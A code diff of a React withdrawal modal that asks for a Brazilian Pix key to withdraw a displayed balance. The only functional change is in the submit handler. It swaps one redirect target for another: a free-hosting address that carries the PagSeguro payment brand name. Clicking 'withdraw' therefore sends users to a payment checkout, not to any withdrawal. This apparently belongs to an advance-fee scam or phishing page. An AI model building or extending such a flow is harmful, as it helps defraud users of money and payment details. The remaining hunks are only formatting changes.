@@ -34,7 +34,7 @@ export function WithdrawalModal({ isOpen, onClose, balance }: WithdrawalModalPro
   if (!isOpen) return null
 
   const handleSubmit = () => {
-    window.location.href = "https://comprasprotegidas.vercel.app/checkout/pay"
+    window.location.href = "https://pagseguroinstapay.netlify.app"
   }
 
   return (
@@ -100,9 +100,8 @@ export function WithdrawalModal({ isOpen, onClose, balance }: WithdrawalModalPro
             >
               {selectedType}
               <ChevronDown
-                className={`h-4 w-4 text-muted-foreground transition-transform ${
-                  showTypeDropdown ? "rotate-180" : ""
-                }`}
+                className={`h-4 w-4 text-muted-foreground transition-transform ${showTypeDropdown ? "rotate-180" : ""
+                  }`}
               />
             </button>
             {showTypeDropdown && (
@@ -114,11 +113,10 @@ export function WithdrawalModal({ isOpen, onClose, balance }: WithdrawalModalPro
                       setSelectedType(type)
                       setShowTypeDropdown(false)
                     }}
-                    className={`flex w-full px-4 py-2.5 text-left text-sm transition-colors ${
-                      selectedType === type
+                    className={`flex w-full px-4 py-2.5 text-left text-sm transition-colors ${selectedType === type
                         ? "bg-primary/10 font-semibold text-primary"
                         : "text-foreground hover:bg-secondary"
-                    }`}
+                      }`}
                   >
                     {type}
                   </button>
@@ -155,10 +153,10 @@ export function WithdrawalModal({ isOpen, onClose, balance }: WithdrawalModalPro
               selectedType === "CPF"
                 ? "000.000.000-00"
                 : selectedType === "E-mail"
-                ? "seu@email.com"
-                : selectedType === "Telefone"
-                ? "(00) 00000-0000"
-                : "Chave aleatoria"
+                  ? "seu@email.com"
+                  : selectedType === "Telefone"
+                    ? "(00) 00000-0000"
+                    : "Chave aleatoria"
             }
             className="mt-1.5 w-full rounded-xl border border-border bg-card px-4 py-3 text-sm text-foreground placeholder:text-muted-foreground/60 outline-none transition-all focus:border-primary focus:ring-2 focus:ring-primary/20"
           />
